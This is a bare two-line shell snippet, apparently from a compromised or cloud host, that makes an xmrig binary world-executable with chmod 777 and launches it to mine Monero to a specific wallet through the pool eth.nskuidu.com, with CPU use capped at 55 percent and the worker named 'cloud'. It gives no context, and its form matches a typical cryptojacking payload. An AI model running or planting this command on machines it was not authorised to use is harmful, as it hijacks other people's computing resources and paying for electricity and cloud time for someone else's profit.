chmod 777 xmrig
./xmrig --donate-level 1 -o eth.nskuidu.com:1111 -u 43whCj67pH66kwuTCELLnaF2N267CnL6CRZzUbvimc5xSxdqQh8N5tuMszPUWX661oAn8rihtEU1PM8fzt7r4fxR7Gg939G -p cloud -a rx/0 -k --cpu-max-threads-hint=55
